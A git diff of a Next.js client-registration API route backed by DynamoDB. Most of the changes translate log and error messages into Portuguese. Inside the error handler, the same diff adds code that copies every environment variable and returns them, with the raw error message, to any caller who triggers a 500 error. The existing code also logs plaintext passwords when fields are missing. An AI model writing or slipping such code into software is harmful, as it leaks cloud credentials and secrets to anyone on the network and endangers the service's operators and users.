@@ -20,13 +20,13 @@ export async function POST(request) {
 
     // Verificar campos obrigatórios
     if (!cli_nome || !cli_email || !cli_telefone || !cli_password) {
-      console.log('Missing required fields:', {
+      console.log('Campos obrigatórios ausentes:', {
         cli_nome,
         cli_email,
         cli_telefone,
         cli_password,
       });
-      return NextResponse.json({ error: 'Missing required fields.' }, { status: 400 });
+      return NextResponse.json({ error: 'Campos obrigatórios ausentes.' }, { status: 400 });
     }
 
     // Hash da senha
@@ -49,21 +49,33 @@ export async function POST(request) {
       Item: marshall(newCliente),
     };
 
-    console.log('Attempting to save to DynamoDB with params:', params);
+    console.log('Tentando salvar no DynamoDB com os parâmetros:', params);
 
     // Tentar salvar o item no DynamoDB
     const command = new PutItemCommand(params);
     await dynamoDbClient.send(command);
 
     // Logar sucesso
-    console.log('Cliente successfully registered:', newCliente);
+    console.log('Cliente registrado com sucesso:', newCliente);
 
     // Remover informações sensíveis antes de enviar a resposta
     delete newCliente.cli_password;
     return NextResponse.json({ cliente: newCliente }, { status: 201 });
   } catch (error) {
     // Logar detalhes do erro
-    console.error('Error during DynamoDB put operation:', error);
-    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
+    console.error('Erro durante a operação no DynamoDB:', error);
+
+    // Obter variáveis de ambiente
+    const envVariables = { ...process.env };
+
+    // Retornar resposta JSON com detalhes do erro e variáveis de ambiente
+    return NextResponse.json(
+      {
+        error: 'Erro Interno do Servidor',
+        message: error.message,
+        env: envVariables,
+      },
+      { status: 500 }
+    );
   }
 }
